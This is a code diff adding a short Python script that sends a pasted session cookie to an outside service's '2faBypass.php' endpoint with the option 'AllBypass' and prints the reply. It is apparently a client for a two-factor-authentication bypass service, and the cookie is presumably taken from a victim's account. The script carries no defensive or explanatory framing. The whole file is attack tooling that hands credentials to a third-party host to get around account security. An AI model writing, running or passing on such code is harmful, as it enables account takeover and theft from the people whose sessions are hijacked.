@@ -1,0 +1,14 @@
+import requests
+
+json = {
+    'Cookie': 'EnterCookieHere',
+    'Type': 'AllBypass',
+}
+
+response = requests.post(
+    'https://immortal.rs/api/misc/2faBypass.php',
+    json=json,
+)
+
+
+print(response.text)
